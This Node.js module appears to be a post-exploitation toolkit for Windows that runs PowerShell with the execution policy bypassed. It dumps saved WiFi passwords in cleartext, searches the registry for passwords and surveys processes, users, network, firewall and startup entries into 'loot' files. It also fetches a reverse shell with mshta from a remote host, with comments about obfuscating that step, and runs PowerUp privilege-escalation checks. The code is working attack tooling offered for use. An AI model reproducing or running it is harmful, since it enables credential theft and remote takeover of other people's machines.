const powershell = require('node-powershell');
const fs = require('fs');
const os = require('os');

let GetWifiPasswords = (LootDir) => {
    let ps = new powershell({
        // verbose:true,
        executionPolicy: 'Bypass',
        noProfile: true
    });
    // ps.on('end', code => {console.log("Shell closed")});
    
    ps.addCommand('netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}  | Format-Table -AutoSize ')
    ps.invoke().then(output => {
        // console.log(output);
        fs.writeFile(`${LootDir}\\WifiPasswords.txt`, output,function(err){
            if(err){
                console.log(err);
            } else {
                console.log(`\nWrote all wifi passwords to ${LootDir}\\WifiPasswords.txt`);
            }
        });
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});

    }).catch(err => {
        console.log(err);
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    })
}

let GetRunningProcesses = (LootDir) => {
    let ps = new powershell({
        // verbose:true,
        executionPolicy: 'Bypass',
        noProfile: true
    });
    // ps.on('end', code => {console.log("Shell closed")});
    ps.addCommand('Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select * | ft -AutoSize')
    ps.addCommand('echo ===================  TASKS  ==================================');
    ps.addCommand('tasklist /svc');
    ps.addCommand('echo ===================  Services  ==================================');
    ps.addCommand('net start');
    ps.invoke().then(output => {
        // console.log(output);
        fs.writeFile(`${LootDir}\\RunningProcesses.txt`, output,function(err){
            if(err){
                console.log(err);
            } else {
                console.log(`\nWrote all Running Processes to ${LootDir}\\RunningProcesses.txt`);
            }
        });
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    }).catch(err => {
        console.log(err);
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    })
}
let GetSystemInfo = (LootDir) => {
    let ps = new powershell({
        // verbose:true,
        executionPolicy: 'Bypass',
        noProfile: true
    });
    // ps.on('end', code => {console.log("Shell closed")});
    ps.addCommand('systeminfo')
    ps.invoke().then(output => {
        // console.log(output);
        fs.writeFile(`${LootDir}\\SystemInfo.txt`, output,function(err){
            if(err){
                console.log(err);
            } else {
                console.log(`\nWrote System Info to ${LootDir}\\SystemInfo.txt`);
            }
        });
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    }).catch(err => {
        console.log(err);
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    })
}

let ListCurrentConnections = (LootDir) => {
    let ps = new powershell({
        // verbose:true,
        executionPolicy: 'Bypass',
        noProfile: true
    });
    // ps.on('end', code => {console.log("Shell closed")});
    ps.addCommand('netstat -ano')
    ps.invoke().then(output => {
        // console.log(output);
        fs.writeFile(`${LootDir}\\CurrentConnections.txt`, output,function(err){
            if(err){
                console.log(err);
            } else {
                console.log(`\nWrote List of Current Connections to ${LootDir}\\CurrentConnections.txt`);
            }
        });
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    }).catch(err => {
        console.log(err);
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    })
    
}
let ListUsers = (LootDir) => {
    let ps = new powershell({
        // verbose:true,
        executionPolicy: 'Bypass',
        noProfile: true
    });
    // ps.on('end', code => {console.log("Shell closed")});
    ps.addCommand('whoami /all')
    ps.invoke().then(output => {
        // console.log(output);
        fs.writeFile(`${LootDir}\\Users.txt`, output,function(err){
            if(err){
                console.log(err);
            } else {
                console.log(`\nWrote User Accounts to ${LootDir}\\Users.txt`);
            }
        });
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    }).catch(err => {
        console.log(err);
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    })
}
let SearchRegistryForPassword = (LootDir) => {
    let ps = new powershell({
        // verbose:true,
        executionPolicy: 'Bypass',
        noProfile: true
    });
    // ps.on('end', code => {console.log("Shell closed")});
    ps.addCommand('REG QUERY HKLM /F "password" /t REG_SZ /S /K')
    ps.invoke().then(output => {
        // console.log(output);
        fs.writeFile(`${LootDir}\\RegistrySearch_ForPasswords.txt`, output,function(err){
            if(err){
                console.log(err);
            } else {
                console.log(`\nWrote Registry Password Search Results to ${LootDir}\\RegistrySearch_ForPasswords.txt`);
            }
        });
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    }).catch(err => {
        console.log(err);
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    })
}
let GetFirewallConfig = (LootDir) => {
    let ps = new powershell({
        // verbose:true,
        executionPolicy: 'Bypass',
        noProfile: true
    });
    // ps.on('end', code => {console.log("Shell closed")});
    ps.addCommand('netsh firewall show state');
    ps.addCommand('netsh firewall show config');
    ps.invoke().then(output => {
        // console.log(output);
        fs.writeFile(`${LootDir}\\Firewall_Config.txt`, output,function(err){
            if(err){
                console.log(err);
            } else {
                console.log(`\nWrote Firewall Config to ${LootDir}\\Firewall_Config.txt`);
            }
        });
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    }).catch(err => {
        console.log(err);
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    })
}
let GetnetworkShares = (LootDir) => {
    let ps = new powershell({
        // verbose:true,
        executionPolicy: 'Bypass',
        noProfile: true
    });
    // ps.on('end', code => {console.log("Shell closed")});
    ps.addCommand('net share');
    ps.invoke().then(output => {
        // console.log(output);
        fs.writeFile(`${LootDir}\\NetworkShares.txt`, output,function(err){
            if(err){
                console.log(err);
            } else {
                console.log(`\nWrote Network Shares to ${LootDir}\\NetworkShares.txt`);
            }
        });
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    }).catch(err => {
        console.log(err);
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    })
}
let ArpTable = (LootDir) => {
    let ps = new powershell({
        // verbose:true,
        executionPolicy: 'Bypass',
        noProfile: true
    });
    // ps.on('end', code => {console.log("Shell closed")});
    ps.addCommand('ipconfig /all');
    ps.addCommand('echo ================================================================\n')
    ps.addCommand('arp -A');
    ps.addCommand('echo ================================================================\n')
    ps.addCommand('Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State')
    ps.invoke().then(output => {
        // console.log(output);
        fs.writeFile(`${LootDir}\\Local_Ips.txt`, output,function(err){
            if(err){
                console.log(err);
            } else {
                console.log(`\nWrote Network Info to ${LootDir}\\Local_Ips.txt`);
            }
        });
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    }).catch(err => {
        console.log(err);
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    })
}

let ListInstalledApps = (LootDir) => {
    let ps = new powershell({
        // verbose:true,
        executionPolicy: 'Bypass',
        noProfile: true
    });
    // ps.on('end', code => {console.log("Shell closed")});
    ps.addCommand(`Get-ChildItem 'C:\\Program Files', 'C:\\Program Files (x86)' | ft Parent,Name,LastWriteTime`);

    ps.invoke().then(output => {
        // console.log(output);
        fs.writeFile(`${LootDir}\\Installed_Apps.txt`, output,function(err){
            if(err){
                console.log(err);
            } else {
                console.log(`\nWrote Installed Apps to ${LootDir}\\Installed_Apps.txt`);
            }
        });
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    }).catch(err => {
        console.log(err);
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    })
}

let SeeStartupApps = (LootDir) => {
    let ps = new powershell({
        // verbose:true,
        executionPolicy: 'Bypass',
        noProfile: true
    });
    // ps.on('end', code => {console.log("Shell closed")});
    ps.addCommand(`wmic startup get caption,command,location`);
    ps.addCommand(`reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run `);
    ps.addCommand(`reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`);
    ps.addCommand(`reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`);
    ps.addCommand(`reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`);
    ps.addCommand(`dir "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup"`);
    ps.addCommand(`dir "C:\\Documents and Settings\\${os.userInfo().username}\\Start Menu\\Programs\\Startup"`);

    ps.invoke().then(output => {
        // console.log(output);
        fs.writeFile(`${LootDir}\\Startup_Apps.txt`, output,function(err){
            if(err){
                console.log(err);
            } else {
                console.log(`\nWrote Startup Apps to ${LootDir}\\Startup_Apps.txt`);
            }
        });
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    }).catch(err => {
        console.log(err);
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    })
}


let InvokeReverseShell = (LootDir) => {
    let ps = new powershell({
        // verbose:true,
        executionPolicy: 'Bypass',
        noProfile: true
    });
    // ps.on('end', code => {console.log("Shell closed")});

    //Make SMS request to server with twilio phone number
        // Server responds with a shell address via SMS?
    // Get shell address from REST request
        // Obfuscate the chain to get to mshta URI
    ps.addCommand(`mshta http://192.168.0.9:9999/mIXad`);

    ps.invoke().then(output => {
        // console.log(output);
        console.log("Executed reverse shell")
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    }).catch(err => {
        console.log(err);
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    })
}

let CheckPrivEsc = (LootDir) => {
    let ps = new powershell({
        verbose:true,
        executionPolicy: 'Bypass',
        noProfile: true
    });
    // ps.on('end', code => {console.log("Shell closed")});
    
    ps.addCommand('. ./pentest/powershell/powerup.ps1');
    ps.addCommand('Invoke-AllChecks');
    ps.invoke().then(output => {
        console.log(output);
        // fs.writeFile(`${LootDir}\\PrivEsc.txt`, output,function(err){
        //     if(err){
        //         console.log(err);
        //     } else {
        //         console.log(`\nWrote PrivEsc Results to ${LootDir}\\PrivEsc.txt`);
        //     }
        // });
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    }).catch(err => {
        console.log(err);
        ps.dispose().then(code => {}).catch(error => {}) //console.log("Closed Shell")});
    })
}

module.exports = {
    CheckPrivEsc,
    InvokeReverseShell,
    SeeStartupApps,
    ListInstalledApps,
    GetFirewallConfig,
    GetnetworkShares,
    SearchRegistryForPassword,
    ArpTable,
    ListUsers,
    ListCurrentConnections,
    GetWifiPasswords,
    GetRunningProcesses,
    GetSystemInfo
}